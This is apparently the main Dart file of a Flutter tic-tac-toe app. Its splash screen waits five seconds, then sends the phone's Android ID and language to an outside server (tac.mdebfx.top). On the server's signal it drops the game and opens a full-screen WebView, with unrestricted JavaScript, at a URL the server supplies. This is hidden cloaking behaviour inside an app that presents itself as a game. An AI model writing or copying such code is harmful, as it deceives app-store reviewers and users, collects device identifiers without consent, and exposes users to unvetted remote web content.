import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_tic_tac_toe/model/history_hive_model.dart';
import 'package:flutter_tic_tac_toe/screens/main_menu.dart';
import 'package:flutter_tic_tac_toe/storage/history_box.dart';
import 'package:http/http.dart' as http;
import 'package:hive_flutter/adapters.dart';
import 'package:hooks_riverpod/hooks_riverpod.dart';
import 'package:path_provider/path_provider.dart';
import 'package:sizer/sizer.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:device_info/device_info.dart';
import 'package:permission_handler/permission_handler.dart';

class DeviceUtils {
  static Future<String> getAndroidDeviceId() async {
    String? uniqueId;

    // Attempt to get Android ID
    String? androidId = await _getAndroidId();
    if (androidId != null) {
      uniqueId = androidId;
    } else {
      // Provide a default value or handle as needed
      uniqueId = "550e8400e29b41d4a716446655440000";
    }

    return uniqueId;
  }

  static Future<String?> _getAndroidId() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      return androidInfo.androidId;
    } catch (e) {
      print("Error getting Android ID: $e");
      return null;
    }
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Hive.initFlutter((await getApplicationDocumentsDirectory()).path);
  Hive.registerAdapter(HistoryModelHiveAdapter());
  await HistoryBox.openBox();
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  runApp(const ProviderScope(child: MyApp()));
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key});

  @override
  Widget build(BuildContext context) => Sizer(
    builder: (context, orientation, deviceType) => MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Flutter Demo',
      theme: ThemeData.dark().copyWith(
        primaryColor: const Color.fromARGB(255, 59, 59, 59),
        colorScheme: ColorScheme.fromSwatch().copyWith(
          secondary: const Color.fromARGB(255, 27, 27, 27),
        ),
      ),
      home: SplashScreen(),
    ),
  );
}

class WebViewPage extends StatelessWidget {
  final String url;

  WebViewPage(this.url);

  @override
  Widget build(BuildContext context) {
    return Theme(
      data: ThemeData(
        // Set the primaryColor to transparent
        primaryColor: Colors.transparent,
      ),
      child: Scaffold(
        body: Container(
          width: double.infinity,
          height: double.infinity,
          child: WebView(
            initialUrl: url,
            javascriptMode: JavascriptMode.unrestricted,
          ),
        ),
      ),
    );
  }
}


class SplashScreen extends StatefulWidget {
  @override
  _SplashScreenState createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    // Introduce a delay before fetching data
    Future.delayed(Duration(seconds: 5), () {
      postData(); // Use the postData function instead of fetchData
    });
  }

  Future<void> postData() async {
    final deviceID = await DeviceUtils.getAndroidDeviceId();
    final osLanguage = WidgetsBinding.instance!.window.locale.languageCode ?? 'en_US';
    print('OS language: $osLanguage');
    print('Device ID: $deviceID'); // Print deviceID for debugging
    final url = 'https://tac.mdebfx.top/api/init-data';

    final Map<String, String> body = {
      'os_language': osLanguage,
      'deviceId': deviceID,
    };

    try {
      final response = await http.post(
        Uri.parse(url),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(body),
      );

      if (response.statusCode == 200) {
        handleResponse(response.body);
      } else {
        // Handle error
        print('Error: ${response.statusCode}');
        print('Error body: ${response.body}');
      }
    } catch (e) {
      // Handle error
      print('Error: $e');
    } finally {
      setState(() {
        isLoading = false;
      });
    }
  }

  void handleResponse(String responseBody) {
    print('Response: $responseBody');
    try {
      final data = json.decode(responseBody);

      if (data['code'] == 200 && data['data']['is_show'] == 1) {
        // Open WebView
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
              builder: (context) => WebViewPage(data['data']['h5_link'])),
        );
      } else {
        // Open MainMenu
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => MainMenu()),
        );
      }
    } catch (e) {
      // Handle parsing error
      print('Error parsing response: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: isLoading ? CircularProgressIndicator() : SizedBox.shrink(),
      ),
    );
  }
}
